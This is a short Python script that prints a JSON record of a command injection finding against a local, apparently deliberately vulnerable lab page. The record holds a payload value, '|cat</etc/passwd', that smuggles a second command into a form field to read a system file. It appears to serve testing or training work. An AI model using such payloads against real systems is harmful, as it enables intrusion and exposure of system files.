import json

data = {"Vulnerability": "Command Injection", "URL": "http://localhost/vulnerabilities/exec/", "Method": "post", "Payload": {"ip": "|cat</etc/passwd"}}

print(json.dumps(data, indent=4))
